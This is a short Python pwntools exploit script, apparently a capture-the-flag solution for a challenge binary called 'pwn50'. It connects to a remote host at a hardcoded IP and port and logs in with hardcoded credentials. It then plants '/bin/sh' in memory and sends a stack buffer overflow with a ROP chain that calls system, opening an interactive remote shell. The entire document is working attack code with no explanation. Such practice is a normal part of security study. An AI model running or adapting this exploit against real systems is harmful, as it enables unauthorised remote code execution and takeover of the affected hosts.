from pwn import *

p = remote('47.104.16.75',9000)
elf = ELF('pwn50')
context.log_level = 'debug'
p.recvuntil('username: ')
p.sendline('admin')
p.recvuntil('password: ')
p.sendline('T6OBSh2i')
p.recvuntil('Your choice: ')
#gdb.attach(p)

sys_addr = elf.symbols['system']

p.sendline('1')
p.recvuntil('Command: ')
p.sendline('/bin/sh\x00')
p.recvuntil('Your choice: ')
playload = 'A'*88 + p64(0x400b03) + p64(0x601100) + p64(sys_addr)
p.sendline(playload)
p.recvuntil('Your choice: ')
p.sendline('3')
#gdb.attach(p)
p.interactive()
